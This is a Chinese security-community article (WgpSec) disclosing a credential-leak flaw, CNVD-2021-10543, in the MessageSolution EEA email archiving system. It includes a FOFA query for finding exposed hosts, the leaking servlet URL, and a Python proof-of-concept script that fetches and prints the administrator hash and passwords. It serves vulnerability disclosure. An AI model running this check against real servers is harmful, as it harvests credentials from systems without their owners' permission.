> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/B6h1deYLt6e3I4ho43tFBw)

**点击蓝字**

![](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif)

**关注我们**

  

**_声明  
_**

本文作者：PeiQI  
本文字数：996

阅读时长：5min

附件 / 链接：点击查看原文下载

**本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载**

  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，狼组安全团队以及文章作者不为此承担任何责任。

狼组安全团队有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经狼组安全团队允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  

**_前言_**

一、

**_漏洞描述_**

MessageSolution 企业邮件归档管理系统 EEA 是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用 WEB 信息泄漏，泄露 Windows 服务器 administrator hash 与 web 账号密码

二、

**_漏洞影响_**

MessageSolution 企业邮件归档管理系统 EEA  

三、

**_漏洞复现_**

```
FOFA
title="MessageSolution Enterprise Email Archiving (EEA)"
```

登录页面如下

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCkjy5v5yVxVyhmicBHsahq3rA3mSAnYUqab5HTrX3hasX8F5YoX4EYRmep0O8C27ribxQ1ZkgXKK9w/640?wx_fmt=png)

访问如下 Url

```
http://xxx.xxx.xxx.xxx/authenticationserverservlet/
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCkjy5v5yVxVyhmicBHsahq3kicFSzxBfOsuaNkVlL2LibKt6yGER7HibEyRZfBSORDxdSodIpP2ib273g/640?wx_fmt=png)

使用获得到的密码可以登录系统

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCkjy5v5yVxVyhmicBHsahq3WRsZV886KN48oiafQZ1v9AH7JY2SZcMEaAVZOgRnicXzZRlAyvPfMn7Q/640?wx_fmt=png)

漏洞利用 POC  

```
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: MessageSolution 企业邮件归档管理系统EEA                         \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')


def POC_1(target_url):
    vuln_url = target_url + "/authenticationserverservlet/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and "administrator" in response.text:
            print("\033[32m[o] 目标 {} 存在信息泄露 响应为:{}\033[0m".format(target_url, response.text))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))




if __name__ == "__main__":
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```

Goby & POC

```
MessageSolution  邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543
Goby & POC 已经更新到 Github中
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCkjy5v5yVxVyhmicBHsahq3M4yExhfY5H9iavc0AGjKU81MibNoypqehV1ialQpwxr5ia8G59M87XVCFg/640?wx_fmt=png)

四、

**_参考文章_**

**感谢 @Henry4E36 师傅的文章**

https://mp.weixin.qq.com/s/jehAIIYWrpkLtGvGN-LtFA

  

**_作者_**

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDCc55WbFiasXQV2ZDzFo8NclAZ2LicCiaeLqxOD3AticSzDm7rRACia7M9m4pickkG8pXR2w1L8maEoBSw/640?wx_fmt=png)

PeiQi

感谢观看啦~

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec 狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

![](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzBhAsD8IU7jiccdSHt39PeyFafMeibktnt9icyS2D2fQrTSS7wdMicbrVlkqfmic6z6cCTlZVRyDicLTrqg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/gdsKIbdQtWAicUIic1QVWzsMLB46NuRg1fbH0q4M7iam8o1oibXgDBNCpwDAmS3ibvRpRIVhHEJRmiaPS5KvACNB5WgQ/640?wx_fmt=gif)